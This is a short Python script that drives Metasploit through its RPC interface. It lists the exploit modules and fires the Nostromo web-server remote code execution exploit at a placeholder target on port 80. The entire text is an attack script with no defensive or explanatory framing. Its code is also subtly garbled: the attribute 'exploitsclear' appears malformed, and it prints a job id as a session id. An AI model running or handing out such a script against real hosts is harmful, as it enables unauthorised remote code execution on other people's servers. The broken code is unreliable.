from pymetasploit3.msfrpc import MsfRpcClient
client = MsfRpcClient('username', 'password', '127.0.0.1', 55553)  
modules = client.modules.exploitsclear

print("Available Exploits:")
for module in modules:
    print(module)
exploit_module = client.modules.use('exploit', 'exploit/multi/http/nostromo_code_exec')
exploit_module['RHOST'] = 'target_ip'  
exploit_module['RPORT'] = 80            
exploit = exploit_module.execute()
if exploit['job_id']:
    print("Exploit successful! Session ID:", exploit['job_id'])
else:
    print("Exploit failed.")
